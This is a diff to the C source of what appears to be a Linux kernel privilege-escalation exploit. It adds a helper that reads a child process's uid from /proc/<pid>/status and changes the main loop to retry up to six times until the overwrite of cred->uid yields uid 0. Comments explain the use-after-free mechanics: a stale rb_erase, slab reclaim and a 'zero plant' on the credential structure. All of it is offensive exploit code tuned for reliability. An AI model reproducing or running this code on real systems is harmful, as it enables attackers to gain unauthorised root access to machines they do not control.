@@ -748,6 +748,35 @@ static void logf(const char *fmt, ...)
     }
 }
 
+/* Real uid as seen through /proc.  The zero plant writes cred->uid; reading
+ * it back is the only way to know the stale rb_erase actually ran on the
+ * payload, because a later reclaim of the same page can make run_plant()
+ * report success even when the write happened before the payload was in
+ * place. */
+static int proc_uid(pid_t pid)
+{
+    char path[64], buf[512];
+    int fd, n;
+    char *p;
+
+    snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
+    fd = open(path, O_RDONLY);
+    if (fd < 0)
+        return -1;
+    n = (int)read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0)
+        return -1;
+    buf[n] = 0;
+    p = strstr(buf, "\nUid:");
+    if (!p)
+        return -1;
+    p += 5;
+    while (*p == ' ' || *p == '\t')
+        p++;
+    return atoi(p);
+}
+
 static int wr(const char *p, const char *s)
 {
     int fd = open(p, O_WRONLY);
@@ -3312,17 +3341,38 @@ int main(int argc, char **argv)
     if (!g_fake_stage)
     {
         struct plant_res r;
-        memset(&r, 0, sizeof(r));
-        for (int a = 0; a < 3 && !r.ok; a++)
+        int landed = 0;
+
+        for (int a = 0; a < 6 && !landed; a++)
         {
-            logf("[+] plant attempt %d/3\n", a + 1);
+            int uid;
+
+            memset(&r, 0, sizeof(r));
+            logf("[+] plant attempt %d/6\n", a + 1);
             /* Same reason as the permissive path: each attempt needs empty
              * queues, otherwise phase 1 fills them and the burst is all
              * EAGAIN. */
             pool_reset();
             run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
+            if (!r.ok)
+                continue;
+            /*
+             * run_plant() only proves that the victim slab was reclaimed and
+             * the target reaped; it cannot prove the stale rb_erase ran on
+             * the payload.  If the free lands after the phase-1 burst, the
+             * page is reclaimed again after the zombie, i.e. after the
+             * erase already passed.  The child's uid is the ground truth,
+             * so retry the whole plant until the write actually lands.
+             */
+            uid = proc_uid(C);
+            if (uid == 0)
+            {
+                landed = 1;
+                break;
+            }
+            logf("[!] plant %d left child uid=%d; retrying\n", a + 1, uid);
         }
-        if (!r.ok)
+        if (!landed)
             park_forever("no successful plant");
     }
     else
